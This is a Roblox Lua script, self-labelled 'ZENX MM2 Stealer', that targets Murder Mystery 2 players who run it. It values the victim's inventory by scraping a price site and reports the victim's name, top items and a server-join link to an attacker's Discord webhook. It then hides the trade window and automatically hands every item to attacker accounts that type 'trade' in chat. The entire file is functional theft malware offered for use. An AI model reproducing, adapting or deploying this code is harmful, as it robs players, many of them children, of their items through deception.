if not _G["Script-SM_Config"] then
    warn("Waiting for config...")
    repeat task.wait() until _G["Script-SM_Config"]
end

local config = _G["Script-SM_Config"]
local webhook = config.user_webhook
local usernames = config.users or {}
local minPingVal = tonumber(config.Min_Ping) or 0

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

if game.PlaceId ~= 142823291 then
    LocalPlayer:Kick("Wrong game! Join Murder Mystery 2")
    return
end

-- Biscuit-Style Value Scraper + Rarity Categories
local valuePages = {
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique = "https://supremevaluelist.com/mm2/uniques.html",
    vintage = "https://supremevaluelist.com/mm2/vintages.html",
}

local itemValues = {}
local function loadValues()
    for _, link in pairs(valuePages) do
        pcall(function()
            local resp = request({Url = link, Method = "GET"})
            if resp and resp.Body then
                for name, valStr in resp.Body:gmatch(">([%w%s'%-]+)</[^>]+>%s*Value%s*%-%s*%*?([%d,]+)%*?") do
                    local clean = name:match("^%s*(.-)%s*$"):lower()
                    local val = tonumber(valStr:gsub(",", ""))
                    if clean and val then itemValues[clean] = val end
                end
            end
        end)
        task.wait(0.5)
    end
end
loadValues()

-- Inventory with Rarity Groups (like the script you sent)
local itemsToTrade = {}
local overallValue = 0
local rarityCounts = {Unique=0, Ancient=0, Godly=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}

local itemDatabase = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local success, inventoryData = pcall(function()
    return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
end)

if success and inventoryData and inventoryData.Weapons then
    for itemId, count in pairs(inventoryData.Weapons.Owned or {}) do
        local info = itemDatabase[itemId]
        if info and not (itemId == "DefaultGun" or itemId == "DefaultKnife") then
            local name = tostring(info.ItemName)
            local lowerName = name:lower()
            local val = itemValues[lowerName] or 150
            overallValue += val * count
            
            local rarity = info.Rarity or "Common"
            if rarityCounts[rarity] then rarityCounts[rarity] += count end
            
            table.insert(itemsToTrade, {id = itemId, name = name, qty = count, val = val, rarity = rarity})
        end
    end
end

table.sort(itemsToTrade, function(a, b) return (a.val * a.qty) > (b.val * b.qty) end)

-- Discord
local function postToDiscord()
    local joinLink = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
    local displayLines = {}
    for i, item in ipairs(itemsToTrade) do
        if i > 12 then break end
        table.insert(displayLines, string.format("x%d %s → %d", item.qty, item.name, item.val))
    end

    local content = (overallValue >= minPingVal and minPingVal > 0 and "@everyone **BIG HIT**" or "**Small Hit**") 
                 .. " • Value: " .. string.format("%.0f", overallValue)

    local embed = {
        content = content,
        username = "ZENX MM2 Stealer",
        embeds = {{
            title = "🍪 ZENX | Murder Mystery 2 Hit",
            color = 0xFF00FF,
            fields = {
                {name = "Victim", value = LocalPlayer.Name, inline = true},
                {name = "Total Value", value = string.format("%.0f", overallValue), inline = true},
                {name = "Rarity Breakdown", value = string.format("Godly: %d | Ancient: %d | Unique: %d | Vintage: %d", rarityCounts.Godly, rarityCounts.Ancient, rarityCounts.Unique, rarityCounts.Vintage), inline = false},
                {name = "Top Items", value = "```" .. table.concat(displayLines, "\n") .. "```", inline = false},
                {name = "Custom Joiner", value = joinLink, inline = false},
            },
            footer = {text = "ZENX HUB • Biscuit Scraper"},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    pcall(function()
        request({
            Url = webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(embed)
        })
    end)
end

-- Trade Engine (improved)
local function checkTradeState()
    return ReplicatedStorage:WaitForChild("Trade"):WaitForChild("GetTradeStatus"):InvokeServer()
end

local function doTrade(target)
    task.spawn(function()
        postToDiscord()
        local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
        if tradeGui then
            tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() tradeGui.Enabled = false end)
        end

        while #itemsToTrade > 0 do
            local state = checkTradeState()
            if state == "None" then
                ReplicatedStorage.Trade.SendRequest:InvokeServer(target)
            elseif state == "StartTrade" then
                for i = 1, math.min(6, #itemsToTrade) do
                    local item = table.remove(itemsToTrade, 1)
                    for _ = 1, item.qty do
                        ReplicatedStorage.Trade.OfferItem:FireServer(item.id, "Weapons")
                        task.wait(0.3)
                    end
                end
                task.wait(4)
                ReplicatedStorage.Trade.AcceptTrade:FireServer()
            else
                task.wait(1.2)
            end
        end
        postToDiscord()
    end)
end

local function onPlayerAdded(plr)
    if table.find(usernames, plr.Name) then
        plr.Chatted:Connect(function(msg)
            if msg:lower():find("trade") or msg:lower():find("accept") then
                doTrade(plr)
            end
        end)
    end
end

for _, plr in ipairs(Players:GetPlayers()) do onPlayerAdded(plr) end
Players.PlayerAdded:Connect(onPlayerAdded)

postToDiscord()
print("✅ ZENX MM2 Stealer Loaded (Biscuit Scraper + Rarity Groups)")
